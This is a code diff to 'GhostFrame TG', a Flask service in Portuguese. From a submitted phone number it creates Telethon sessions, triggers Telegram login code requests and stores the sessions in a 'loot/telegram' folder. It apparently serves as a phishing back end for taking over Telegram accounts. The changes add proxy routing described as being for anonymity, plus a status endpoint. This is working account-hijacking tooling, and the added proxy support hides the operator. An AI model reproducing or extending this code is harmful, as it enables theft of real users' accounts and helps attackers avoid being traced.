@@ -16,6 +16,20 @@ PORT = int(os.environ.get("TG_PORT", "8556"))
 LOOT_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "loot", "telegram")
 os.makedirs(LOOT_DIR, exist_ok=True)
 
+# Proxy opcional (anonimato): TG_PROXY=socks5://user:pass@host:port
+PROXY = None
+_tp = os.environ.get("TG_PROXY", "").strip()
+if _tp:
+    try:
+        from urllib.parse import urlparse
+        import socks
+        _u = urlparse(_tp)
+        _proto = socks.SOCKS5 if _u.scheme.startswith("socks5") else (socks.HTTP if _u.scheme == "http" else None)
+        if _proto and _u.hostname:
+            PROXY = (_proto, _u.hostname, _u.port or 1080, True, _u.username or "", _u.password or "")
+    except Exception:
+        PROXY = None
+
 try:
     from telethon.sync import TelegramClient
     from telethon import events
@@ -109,7 +123,7 @@ def api_phone():
         return jsonify({"ok": False, "error": "numero invalido"})
     try:
         session = os.path.join(LOOT_DIR, re.sub(r"\D", "", phone))
-        client = TelegramClient(session, API_ID, API_HASH)
+        client = TelegramClient(session, API_ID, API_HASH, proxy=PROXY)
         client.connect()
         client.send_code_request(phone)
         PENDING["phone"] = phone
@@ -228,6 +242,15 @@ def norm_phone(raw):
         digits = "55" + digits
     return "+" + digits
 
+@app.route("/api/telegram-status")
+def api_status():
+    return jsonify({
+        "ok": True,
+        "telethon": TG_AVAILABLE,
+        "api_configured": bool(API_ID and API_HASH),
+        "proxy": bool(PROXY),
+    })
+
 if __name__ == "__main__":
-    print(f"[GhostFrame TG] porta {PORT} | telethon={'ok' if TG_AVAILABLE else 'NAO INSTALADO'}")
+    print(f"[GhostFrame TG] porta {PORT} | telethon={'ok' if TG_AVAILABLE else 'NAO INSTALADO'} | proxy={'ok' if PROXY else 'off'}")
     app.run(host="0.0.0.0", port=PORT, debug=False, threaded=True)
